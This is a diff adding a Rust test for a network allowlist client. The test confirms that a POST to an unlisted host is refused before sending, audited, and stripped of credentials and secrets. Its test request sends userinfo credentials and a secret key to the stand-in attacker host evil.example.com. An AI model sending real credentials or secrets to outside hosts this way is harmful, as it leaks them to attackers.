@@ -412,3 +412,46 @@ async fn builder_error_omits_query_fragment_userinfo() {
     );
     assert_chain_no_leak(&err);
 }
+
+// The allowlist applies to the guarded client: an unlisted host is
+// refused before a socket opens, with the typed variant and an audit
+// record; a listed one (here the loopback mock) is sent.
+#[tokio::test]
+async fn allowlist_refuses_unlisted_hosts_and_audits() {
+    use std::sync::{Arc, Mutex};
+
+    let seen: Arc<Mutex<Vec<String>>> = Arc::default();
+    let sink = seen.clone();
+    let policy = NetPolicy::online()
+        .with_allow_hosts(["graph.microsoft.com"])
+        .with_audit(move |r| sink.lock().unwrap().push(format!("{} {}", r.op, r.dest)));
+    let client = GuardedClient::new(policy).expect("build client");
+
+    let err = client
+        .post("https://u:p@evil.example.com/v1/x?key=q-secret")
+        .send()
+        .await
+        .expect_err("unlisted host was sent");
+    let h = err.as_host_not_allowed().expect("typed variant");
+    assert_eq!(h.method, "POST");
+    assert_eq!(h.url, "https://evil.example.com/v1/x");
+    assert!(!err.is_offline());
+    assert_eq!(
+        *seen.lock().unwrap(),
+        vec!["POST https://evil.example.com/v1/x".to_string()]
+    );
+
+    let mut server = mockito::Server::new_async().await;
+    let mock = server
+        .mock("GET", "/ok")
+        .with_status(204)
+        .create_async()
+        .await;
+    let resp = client
+        .get(format!("{}/ok", server.url()))
+        .send()
+        .await
+        .expect("loopback is exempt from the allowlist");
+    assert_eq!(resp.status().as_u16(), 204);
+    mock.assert_async().await;
+}
